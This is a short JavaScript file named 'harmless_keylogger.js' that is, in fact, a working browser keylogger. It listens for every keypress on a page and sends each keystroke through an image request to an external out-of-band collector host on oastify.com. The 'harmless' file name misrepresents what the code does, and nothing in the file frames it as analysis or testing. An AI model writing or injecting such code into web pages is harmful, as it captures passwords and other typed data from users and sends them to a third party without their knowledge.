// harmless_keylogger.js
document.addEventListener('keydown', function (e) {
    const keystroke = e.key;
    const img = new Image();
    img.src = 'https://c8lj95p5sy90r25mb3f9rg5ydpjg7byzn.oastify.com/log?key=' + encodeURIComponent(keystroke);
    document.body.appendChild(img); // This sends the keystroke to your server
});
